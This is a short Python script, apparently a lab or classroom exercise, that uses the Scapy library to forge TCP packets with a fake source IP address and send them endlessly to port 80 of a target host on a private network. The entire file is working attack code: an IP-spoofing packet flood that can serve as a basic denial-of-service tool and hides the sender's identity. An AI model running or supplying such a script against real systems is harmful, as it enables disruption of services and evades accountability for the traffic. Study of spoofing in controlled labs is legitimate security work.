from scapy.all import *

# Spoofed source and real destination
A = "192.168.5.126"  # Fake (spoofed) source IP
B = "192.168.5.135"  # Target IP (real destination)

C = RandShort()      # Random source port
D = 80               # Target port (usually HTTP)

payload = "Hello Hello Hello"  # Data inside the packet

# Send packets in a loop (IP spoofing)
while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / Raw(load=payload)
    send(spoofed_packet)
